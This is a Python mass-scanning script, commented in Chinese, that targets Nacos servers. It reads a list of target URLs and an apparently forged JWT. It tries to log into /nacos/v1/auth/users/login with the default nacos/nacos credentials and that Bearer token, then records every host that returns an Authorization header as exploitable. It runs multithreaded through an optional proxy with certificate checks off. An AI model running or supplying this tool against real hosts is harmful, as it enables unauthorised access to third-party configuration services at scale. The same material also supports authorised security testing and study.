import requests
import threading

with open('JWT.txt') as f:
    JWT = f.read().strip()

with open('url.txt') as f:
    urls = f.read().strip().split('\n')

# 添加是否使用代理和代理端口的选项
use_proxy = input("是否使用代理？(y/n): ")
if use_proxy.lower() == "y":
    proxy_port = input("请输入代理端口号：")
    proxies = {"http": f"http://127.0.0.1:{proxy_port}", "https": f"http://127.0.0.1:{proxy_port}"}
else:
    proxies = {}

def check_vulnerability(url):
    # 处理url
    url = url.strip()
    if not url.startswith('http'):
        url = 'http://' + url
    if url.endswith('/'):
        url = url[:-1]
    login_url = f"{url}/nacos/v1/auth/users/login"

    # 设置请求头和请求参数
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        'Authorization': f'Bearer {JWT}'
    }
    params = {
        'username': 'nacos',
        'password': 'nacos'
    }

    # 验证是否存在漏洞
    try:
        # 尝试以https协议进行请求
        response = requests.post(login_url, headers=headers, data=params, timeout=3, verify=False, proxies=proxies)
        if response.status_code == 200 and "Authorization" in response.headers:
            print(f'存在漏洞: {url}')
            with open("output.txt", "a") as f:
                f.write(f"{url}\n")
        else:
            # 尝试以http协议进行请求
            http_url = url.replace('https', 'http')
            login_url = f"{http_url}/nacos/v1/auth/users/login"
            response = requests.post(login_url, headers=headers, data=params, timeout=3, verify=False, proxies=proxies)
            if response.status_code == 200 and "Authorization" in response.headers:
                print(f'存在漏洞: {url}')
                with open("output.txt", "a") as f:
                    f.write(f"{url}\n")
            else:
                print(f'不存在漏洞: {url}')
    except Exception as e:
        print(f'访问失败: {url}')

# 使用多线程进行访问
threads = []
for url in urls:
    thread = threading.Thread(target=check_vulnerability, args=(url,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
